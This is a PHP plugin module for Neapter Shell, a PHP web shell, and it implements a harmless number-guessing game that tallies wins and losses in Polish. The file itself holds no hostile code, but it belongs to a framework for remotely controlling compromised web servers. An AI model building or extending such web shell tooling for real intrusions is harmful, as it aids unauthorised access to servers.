<?php

/**
 * Neapter Shell
 *
 * @category  WebShell
 * @package   NeapterShell
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright 2011-2016 Krzysztof Otręba
 *
 * @license http://www.gnu.org/licenses/gpl-3.0.txt GPL3
 * @link    http://github.com/krzotr/neapter-shell
 */

/**
 * If you have a lot of time, you can play with computer.
 *
 * @category  WebShell
 * @package   NeapterShell
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright 2011-2016 Krzysztof Otręba
 *
 * @license http://www.gnu.org/licenses/gpl-3.0.txt GPL3
 * @link    http://github.com/krzotr/neapter-shell
 */
class ModuleGame extends ModuleAbstract
{
    /**
     * Get list of available commands
     *
     * @return array
     */
    public static function getCommands()
    {
        return array('game');
    }

    /**
     * Get module version
     *
     * @return string
     */
    public static function getVersion()
    {
        return '1.0.2 2016-06-17 - <krzotr@gmail.com>';
    }

    /**
     * Get details module information
     *
     * @return string
     */
    public static function getHelp()
    {
        return <<<DATA
Gra z komputerem, wspaniała na samotne wieczory ;)

	Użycie:
		g4m3 cyfra_z_przedziału_0-9

		g4m3 cyfra_z_przedziału_0-9 [ilość_losowań]
DATA;
    }

    /**
     * Execute module
     *
     * @return string
     */
    public function get()
    {
        if ($this->oArgs->getNumberOfParams() === 0) {
            return self::getHelp();
        }

        $sParam = $this->oArgs->getParam(0);
        $iLoop = $this->oArgs->getParam(1);

        if (($sParam !== 'x')
            && !(ctype_digit($sParam) && strlen($sParam) === 1)
        ) {
            return self::getHelp();
        }

        $iLoop = $iLoop ? (int) $iLoop : 10;

        if (($iLoop > 100) || ($iLoop < 1)) {
            return self::getHelp();
        }

        $iWins = 0;
        $iLoses = 0;

        $iDigit = (int) $sParam;

        $sOutput = '';

        $i = 0;
        do {
            if ($sParam === 'x') {
                $iDigit = mt_rand(0, 9);
            }

            $bSUccess = ($iNum = mt_rand(0, 9)) === $iDigit;

            if ($bSUccess) {
                ++$iWins;
            } else {
                ++$iLoses;
            }

            $sOutput .= sprintf(
                "%12s, Twoja liczba: %d, liczba komputera: %d\r\n",
                ($bSUccess ? 'Wygrałeś' : 'Przegrałeś'),
                $iDigit,
                $iNum
            );
        } while (++$i < $iLoop);

        return sprintf(
            "\r\nPodsumowanie:\r\n" .
                "Przegrałeś: %d, Wygrałeś: %d, Success rate: %.2f %%\r\n\r\n%s",
            $iLoses,
            $iWins,
            ($iWins / $iLoop) * 100,
            $sOutput
        );
    }
}
